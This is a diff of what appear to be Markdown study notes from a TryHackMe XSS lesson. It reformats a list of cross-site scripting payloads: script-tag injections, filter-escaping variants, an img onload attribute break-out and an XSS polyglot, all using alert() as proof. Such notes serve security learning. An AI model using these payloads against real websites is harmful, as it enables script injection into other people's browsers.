@@ -87,15 +87,38 @@ http://vulnerable-site.com#<img src=x onerror=alert('XSS')>
 
 ```
 
-`<script>alert('XSS');</script>`
 
-- Simple XSS :  `<script>alert('THM');</script>`
-- escaping  input tag:  `"><script>alert('THM');</script>`
-- escaping HTML tag: `</textarea><script>alert('THM');</script>`
-- escaping JavaScript code: `';alert('THM');//`
-- escaping script word filtering: `<sscriptcript>alert('THM');</sscriptcript>`
-- escaping `<>` tag filtering inside `img` tag:  `/images/cat.jpg" onload="alert('THM');`
-- Polyglots: An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.  `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e`
+
+Simple XSS:
+  ```html
+  <script>alert('THM');</script>
+  ```
+
+escaping  input tag:  
+```html
+"><script>alert('THM');</script>
+```
+
+escaping HTML tag:
+```html
+</textarea><script>alert('THM');</script>
+```
+escaping JavaScript code: 
+```html
+';alert('THM');//
+```
+escaping script word filtering: 
+```html
+<sscriptcript>alert('THM');</sscriptcript>
+```
+escaping `<>` tag filtering inside `img` tag:  
+```html
+/images/cat.jpg" onload="alert('THM');
+```
+Polyglots: An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.  
+```html
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
 
 ## Testing Blind XSS
 
